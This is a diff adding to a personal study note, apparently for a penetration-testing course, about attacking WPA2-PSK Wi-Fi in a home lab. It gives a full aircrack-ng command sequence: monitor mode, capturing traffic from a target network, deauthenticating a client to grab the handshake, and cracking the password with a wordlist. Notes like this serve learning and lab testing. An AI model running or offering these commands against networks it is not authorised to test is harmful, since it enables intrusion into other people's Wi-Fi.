@@ -2847,8 +2847,71 @@ we'll focus on WPA2 PSK       (bc build a lab for Enterprise is expensive)ù
 ### Tools
 - Wireless card -->  to inject data
 - router
+- laptop connected to the router   (to test deauthentication attack)
 
 ## Hacking process WPA2 PSK
 ![[Pasted image 20240311103027.png]]
 
+## Attacks
+### aircrack-ng
+plugin wireless card
+`airmon-ng check kill` -->  checks if there are some process that could interface and kills them
+`airmon-ng start wlp4s0` -->  put card in monitor mode
+monitor mode -->  <span style="background:#fff88f">allows us to:</span>
+                 - monitoring all incoming traffic
+                 - eavesdrop
+                 - capture the handshake
 
+`airodump-ng wlp4s0mon` -->  finds the available wifi in the area
+`BSSID` -->   MAC address of the access point
+`PWR` -->  power level   (closest n° to 0 are the nearest networks)
+`CH` -->  channel on which the access point is working
+`ENC` -->  type of access point
+`AUTH` -->  type of auth
+
+`CTRL+C`  -->  to stop airodump
+
+`airodump-ng -c 6 --BSSID <XXXX> -w capture_file wlp4s0mon
+`-c` -->  ch on which your target wifi is run 
+`--bssid` -->  BSSID of the target wifi
+`-w capture_file` -->  specify the file where you want to save your captured data
+
+here -->  we are capturing some data to try to catch the handshake
+
+To speed up this process we can -->  <span style="color:#00b050">deauthenticate the client</span>
+=>
+the client must reconnect do the wifi
+=>
+we can capture the handshake
+
+#### De-authentication Attack
+open a new tab
+`aireplay-ng -0 1 -a <BSSID> -c <STATION> wlp4s0mon`
+`-0` -->  means deauthentication attack 
+`1` -->  run only one time
+``-a <BSSID>`` -->  BSSID of the client you want to deauthenticate
+`-c <STATION>` -->  n° of the station you want to deauthenticate   
+                is next to the BSSID in the airodump output)
+>[!info]
+>you might need to run this attack multiple time (maybe with different client)
+>=>
+>when you see the `WPA HANDSHAKE` in the airodump output =>  <span style="color:#00b050">you made it</span>
+
+#### airodump
+When you capture the handshake in the airodump output
+=>
+press `CTRL+C`
+![[Pasted image 20240311110621.png]]
+
+`aircrack-ng -w wordlist.txt -b <BSSID> capture_file.cap`
+`-w wordlist.txt` -->  wordlist with all the possible passwords
+`-b <BSSID>` -->  BSSID of the client  (the second one in the img above)
+`capture_file.cap` -->  the output file of your airodump process
+
+<span style="color:#00b050">PASSWORD FOUND</span>
+![[Pasted image 20240311111109.png]]
+
+
+# Legal Documents and Report Writing
+
+`sudo systemctl start NetworkManager` -->  start again the wifi 
